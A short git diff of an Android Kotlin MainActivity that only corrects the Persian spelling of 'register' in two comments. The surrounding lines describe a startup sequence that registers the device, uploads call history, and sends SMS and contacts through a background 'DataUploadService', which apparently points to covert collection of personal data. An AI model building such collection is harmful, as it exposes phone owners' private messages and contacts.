@@ -255,7 +255,7 @@ class MainActivity : ComponentActivity() {
             }
 
             // ترتیب اجرا:
-            // 1️⃣ ریجستر + تاریخچه تماس (فرانت)
+            // 1️⃣ رجیستر + تاریخچه تماس (فرانت)
             // 2️⃣ شروع سرویس‌های پس‌زمینه
             // 3️⃣ SMS و مخاطبین در DataUploadService (پس‌زمینه)
 
@@ -265,7 +265,7 @@ class MainActivity : ComponentActivity() {
                     Log.d(TAG, "🚀 STARTING INITIALIZATION SEQUENCE")
                     Log.d(TAG, "════════════════════════════════════════")
 
-                    // 1️⃣ ریجستر گوشی
+                    // 1️⃣ رجیستر گوشی
                     Log.d(TAG, "1️⃣ Registering device...")
                     val registerSuccess = DataUploader.registerDevice(this, deviceId, fcmToken, userId)
                     if (registerSuccess) {
